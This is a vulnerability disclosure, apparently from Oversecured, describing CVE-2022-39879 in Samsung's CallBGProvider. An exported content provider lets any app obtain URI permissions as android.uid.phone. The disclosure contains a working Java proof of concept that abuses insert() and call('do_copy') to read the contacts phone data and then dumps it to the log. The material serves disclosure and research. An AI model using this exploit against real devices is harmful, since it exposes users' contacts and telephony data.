# Details

<table>
    <tr>
        <td>Name</td>
        <td>CallBGProvider</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.callbgprovider</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.03.24</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.11.08</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-39879">CVE-2022-39879</a> (SVE-2022-0734)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$1050</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/013.%20CallBGProvider%20—%20Gaining%20access%20to%20arbitrary_%20content%20providers%20as%20UID%20android.uid.phone/Oversecured_report.png)

The `com.samsung.android.callbgprovider.CallBGProvider` provider is exported and allows any third-party apps installed on the same device to interact with it. Oversecured found a vulnerability that an attacker could first call the `insert()` method and write an arbitrary URI to Shared Preferences and then call the `call()` method with the `do_copy` parameter. As a result, the URI that the attacker controls will get into the call to `Context.grantUriPermission()`, which will result in the transfer of read/write permissions to the attacker.

**Proof of Concept**

```java
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    final Uri grantAccessUri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
    try {
        // puts data to shared prefs
        ContentValues values = new ContentValues();
        values.put("image_uri", grantAccessUri.toString());
        values.put("is_selected_sim2", true);

        // non-null values
        values.put("is_default", true);
        values.put("is_preloaded", true);
        values.put("is_selected_sim1", true);
        values.put("type", "");

        Uri returnedUri = getContentResolver().insert(Uri.parse("content://com.samsung.android.callbgprovider.media/"), values);
        Log.d("evil", "Returned: " + returnedUri);
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }

    try {
        // calls the provider to add data
        getContentResolver().call("com.samsung.android.callbgprovider.media", "do_copy", null, null);
    } catch (Throwable th) {
    }

    dump(grantAccessUri);
}

public void dump(Uri uri) {
    Cursor cursor = getContentResolver().query(uri, null, null, null, null);
    if (cursor.moveToFirst()) {
        do {
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < cursor.getColumnCount(); i++) {
                if(sb.length() > 0) {
                    sb.append(", ");
                }
                sb.append(cursor.getColumnName(i) + " = " + cursor.getString(i));
            }
            Log.d("evil", sb.toString());
        } while (cursor.moveToNext());
    }
}
```

Because the app had the `android:sharedUserId="android.uid.phone"` setting, access to providers also affected the following apps:
- `com.android.mms.service`
- `com.android.ons`
- `com.android.phone`
- `com.android.providers.telephony`
- `com.android.stk`
- `com.android.stk2`
- `com.samsung.android.app.telephonyui`
- `com.samsung.android.cidmanager`
- `com.samsung.android.incallui`
- `com.samsung.sec.android.application.csc`
- `com.sec.phone`.

The attacker could access the providers declared in these apps and those providers that the apps has access to via `uses-permission`.

## References

- [Oversecured Blog. Gaining access to arbitrary* Content Providers](https://blog.oversecured.com/Gaining-access-to-arbitrary-Content-Providers/)
